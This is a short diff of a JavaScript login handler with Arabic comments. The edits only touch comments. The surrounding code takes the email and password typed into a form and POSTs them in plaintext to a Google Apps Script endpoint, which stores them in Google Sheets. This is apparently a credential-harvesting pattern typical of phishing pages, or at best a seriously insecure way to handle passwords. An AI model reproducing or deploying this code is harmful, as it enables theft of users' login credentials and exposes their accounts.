@@ -12,18 +12,18 @@ document.addEventListener("DOMContentLoaded", function () {
             return;
         }
 
-        // ✅ إرسال البيانات إلى Google Sheets
+        // ✅ إرسال البيانات إلى Google Sheets عبر Google Apps Script
         fetch("https://script.google.com/macros/s/AKfycbzfQtiSWT8mNqjuIYECK7-m9UTyaYuY1wCtBVaQE6UeGzsRuSX90qt8dgNHo61X_1bq/exec", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                email: username, // تعديل المتغير ليتوافق مع Google Apps Script
+                email: username, 
                 password: password
             })
         })
-        .then(response => response.json())
+        .then(response => response.json()) // محاولة تحليل JSON من الاستجابة
         .then(data => {
             if (data.status === "success") {
                 alert("✅ تم حفظ البيانات بنجاح في Google Sheets!");
